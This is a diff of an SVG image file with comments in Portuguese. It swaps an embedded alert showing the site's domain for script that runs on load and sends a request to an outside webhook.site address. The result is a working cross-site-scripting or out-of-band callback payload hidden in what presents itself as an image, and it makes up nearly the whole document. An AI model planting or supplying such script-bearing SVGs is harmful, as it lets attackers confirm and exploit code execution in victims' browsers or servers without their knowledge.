@@ -4,13 +4,21 @@
 
   <script type="text/ecmascript">
     <![CDATA[
-      // Função para exibir um alerta com o domínio do site
-      function showDomainAlert() {
-        alert("Domain: " + window.location.hostname);
+      // Função para enviar uma requisição ao endpoint especificado
+      function sendRequest() {
+        fetch('https://webhook.site/58ab4ba1-cb04-46c0-81cd-15c69bb024b6', {
+          method: 'GET'
+        })
+        .then(response => {
+          console.log('Request sent successfully:', response);
+        })
+        .catch(error => {
+          console.error('Error sending request:', error);
+        });
       }
 
-      // Chama a função showDomainAlert imediatamente ao carregar o SVG
-      showDomainAlert();
+      // Chama a função sendRequest imediatamente ao carregar o SVG
+      sendRequest();
     ]]>
   </script>
 </svg>
